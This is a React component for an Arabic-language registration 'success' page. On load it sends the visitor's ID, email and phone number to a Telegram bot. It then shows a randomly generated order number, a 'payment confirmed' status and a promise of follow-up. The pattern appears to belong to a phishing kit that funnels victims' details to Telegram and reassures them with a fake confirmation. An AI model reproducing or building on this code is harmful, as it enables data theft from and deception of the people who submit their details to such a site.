import React, { useEffect } from 'react';
import { useRegistration } from '../contexts/RegistrationContext';
import Header from '../components/Header';
import Footer from '../components/Footer';

const Success = () => {
  const { sendTelegramMessage, formData } = useRegistration();

  useEffect(() => {
    const sendNotification = async () => {
      await sendTelegramMessage(
        `🎉 اكتمال العملية بنجاح!\n\n` +
        `✅ وصل المستخدم لصفحة النجاح\n` +
        `🆔 معرف المستخدم: ${formData.visitorId || 'غير متوفر'}\n` +
        `📧 البريد: ${formData.email || 'غير متوفر'}\n` +
        `📱 الهاتف: ${formData.phone || 'غير متوفر'}`
      );
    };
    sendNotification();
  }, []);

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col" dir="rtl">
      <Header />

      <div className="flex-1 flex flex-col items-center justify-center p-6">
        <div className="bg-white rounded-2xl shadow-lg p-8 w-full max-w-md text-center">
          <div className="w-20 h-20 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-6">
            <svg className="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" d="M5 13l4 4L19 7" />
            </svg>
          </div>

          <h1 className="text-3xl font-bold text-green-600 mb-4">
            تم بنجاح!
          </h1>

          <p className="text-gray-600 mb-6">
            تم تقديم طلبك بنجاح. سيتم مراجعة طلبك والتواصل معك خلال 24-48 ساعة.
          </p>

          <div className="bg-gray-50 rounded-lg p-4 mb-6">
            <p className="text-sm text-gray-500 mb-1">رقم الطلب</p>
            <p className="text-lg font-bold text-[#6A0F49]">
              #{Math.random().toString(36).substring(2, 10).toUpperCase()}
            </p>
          </div>

          <div className="space-y-3 text-sm text-gray-600">
            <div className="flex items-center gap-2">
              <svg className="w-5 h-5 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
              </svg>
              <span>تم استلام الطلب</span>
            </div>
            <div className="flex items-center gap-2">
              <svg className="w-5 h-5 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
              </svg>
              <span>تم تأكيد الدفع</span>
            </div>
            <div className="flex items-center gap-2">
              <svg className="w-5 h-5 text-yellow-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
              </svg>
              <span>قيد المراجعة</span>
            </div>
          </div>

          <div className="mt-8 p-4 bg-blue-50 rounded-lg">
            <p className="text-blue-800 text-sm">
              📧 سيتم إرسال تأكيد بالبريد الإلكتروني قريباً
            </p>
          </div>
        </div>
      </div>

      <Footer />
    </div>
  );
};

export default Success;
